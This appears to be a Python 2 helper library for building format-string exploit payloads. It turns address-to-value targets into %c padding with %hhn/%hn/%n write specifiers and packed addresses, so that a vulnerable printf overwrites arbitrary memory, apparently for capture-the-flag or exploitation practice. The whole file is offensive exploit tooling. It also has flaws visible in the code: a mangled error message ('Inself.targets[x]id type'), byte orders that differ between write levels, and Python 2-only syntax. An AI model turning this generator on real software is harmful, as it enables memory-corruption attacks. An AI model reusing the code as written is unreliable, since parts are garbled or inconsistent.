import struct

bytes_classes = (bytes, str, bytearray)


def p64(x):
    return struct.pack('<Q', x)

def u64(x):
    return struct.unpack('<Q', x)[0]

def u32(x):
    return struct.unpack('<I', x)[0]

def u16(x):
    return struct.unpack('<H', x)[0]



class Fmt(object):
    offset = None
    written = 0

    # Raw address/value key-value
    targets = {}
    # Processed address/value key-value
    table = {}
    payload = None

    def __init__(self, offset=None, written=0):
        self.offset = offset
        self.written = written

    # Stores the raw address and values to self.target
    def __setitem__(self, address, val):
        self.targets[address] = val

    # Build final payload
    # level: 0 => hhn   1 byte
    #        1 => hn    2 bytes
    #        2 => n     4 bytes(deprecated)
    def build(self, level=0):
        # Clean previous table
        self.table = {}
        # (Re)generate splitted key-value dict
        self.build_table(level)

        # Sort the table in ascending order of value
        to_write = sorted(self.table.items(), key=lambda x: x[1])

        # A list of splitted payload. Concating it is payload.
        to_concat = []

        # copy of the two varibles locally
        tmp_offset = self.offset
        tmp_written = self.written

        # Add %n$c and %n specifiers
        for kv_target in to_write:
            # If previously printed, calculate num of chars to overflow
            if level == 2:
                num_chars_to_write = (kv_target[1] - tmp_written) & (2 ** 32 - 1)
            elif level == 1:
                num_chars_to_write = (kv_target[1] - tmp_written) & (2 ** 16 - 1)
            elif level == 0:
                num_chars_to_write = (kv_target[1] - tmp_written) & (2 ** 8 - 1)

            # If num is not 0, first use %0n$c to pad
            # Else just use %n to write 0
            if num_chars_to_write != 0:
                print_chars = "{}c".format(num_chars_to_write)
                # Align to 8
                while (len(print_chars) + 2) % 8 != 0:
                    print_chars = "0" + print_chars
                print_chars = "%0" + print_chars
                to_concat.append(print_chars)

            # Add %n specifier
            if level == 2:
                write_chars = "%xxxxx$n"
            elif level == 0:
                write_chars = "%xxx$hhn"
            elif level == 1:
                write_chars = "%xxxx$hn"
            to_concat.append(write_chars)

            # Log how many chars has already been written
            tmp_written += num_chars_to_write


        # A to_concat[i] now is either %n$c or %n
        for i in range(len(to_concat)):
            snippet = to_concat[i]
            if level == 2:
                if "xxxxx" in snippet:
                    # Calculate where the offset of address bytes would be and replace
                    to_concat[i] = snippet.replace("xxxxx", str(self.offset + len("".join(to_concat)) / 8).rjust(5, "0"))
                    # Append the address bytes to the end
                    to_concat.append(p64(to_write[0][0]))
                    # Use the next address in next loop
                    to_write.pop(0)
            elif level == 1:
                if "xxxx" in snippet:
                    to_concat[i] = snippet.replace("xxxx", str(self.offset + len("".join(to_concat)) / 8).rjust(4, "0"))
                    to_concat.append(p64(to_write[0][0]))
                    to_write.pop(0)
            elif level == 0:
                if "xxx" in snippet:
                    to_concat[i] = snippet.replace("xxx", str(self.offset + len("".join(to_concat)) / 8).rjust(3, "0"))
                    to_concat.append(p64(to_write[0][0]))
                    to_write.pop(0)

        # Construct the payload
        self.payload = "".join(to_concat)
        return self.payload

    def build_table(self, level=0):
        if level == 2:
            print "\033[1;35m[Warning]\033[0m Using %n is likely to fail if value is large therefore is deprecated."
            for address in self.targets:
                if type(self.targets[address]) is str:
                    # If length > int(4 bytes), split them into different numbers
                    if len(self.targets[address]) > 4:
                        tmp_content = self.targets[address]
                        tmp_offset = 0
                        while len(tmp_content) > 4:
                            self.table[address + tmp_offset] = u32(tmp_content[-4:])
                            tmp_content = tmp_content[:-4]
                            tmp_offset += 4
                        self.table[address + tmp_offset] = u32(tmp_content.ljust(4, "\x00"))
                    else:
                        self.table[address] = u32(self.targets[address].ljust(4, "\x00"))
                elif type(self.targets[address]) is int:
                    # If size > int, split them into different numbers
                    if self.targets[address] > (2 ** 32 - 1):
                        tmp_value = self.targets[address]
                        tmp_offset = 0
                        while tmp_value > (2 ** 32 - 1):
                            self.table[address + tmp_offset] = tmp_value % (2 ** 32)
                            tmp_value = tmp_value >> 32
                            tmp_offset += 4
                        self.table[address + tmp_offset] = tmp_value
                    else:
                        self.table[address] = self.targets[address]

        elif level == 1:
            for address in self.targets:
                if type(self.targets[address]) is str:
                    # If length > short(2 bytes), split them into different numbers
                    if len(self.targets[address]) > 2:
                        tmp_content = self.targets[address]
                        tmp_offset = 0
                        while len(tmp_content) > 2:
                            self.table[address + tmp_offset] = u16(tmp_content[:2])
                            tmp_content = tmp_content[2:]
                            tmp_offset += 2
                        self.table[address + tmp_offset] = u16(tmp_content.ljust(2, "\x00"))
                    else:
                        self.table[address] = u16(self.targets[address].ljust(2, "\x00"))
                elif type(self.targets[address]) is int:
                    # If size > short, split them into different numbers
                    if self.targets[address] > (2 ** 16 - 1):
                        tmp_value = self.targets[address]
                        tmp_offset = 0
                        while tmp_value > (2 ** 16 - 1):
                            self.table[address + tmp_offset] = tmp_value % (2 ** 16)
                            tmp_value = tmp_value >> 16
                            tmp_offset += 2
                        self.table[address + tmp_offset] = tmp_value
                    else:
                        self.table[address] = self.targets[address]

        elif level == 0:
            # Split all bytes
            for x in self.targets:
                if type(self.targets[x]) is int:
                    to_write = {(x + i, v) for i, v in enumerate(bytearray(p64(self.targets[x])))}
                elif type(self.targets[x]) in bytes_classes:
                    to_write = {(x + i, v) for i, v in enumerate(bytearray(self.targets[x]))}
                else:
                    raise TypeError('Inself.targets[x]id type of `self.targets[x]`')

                self.table.update(to_write)
        else:
            raise RuntimeError("Level Error")
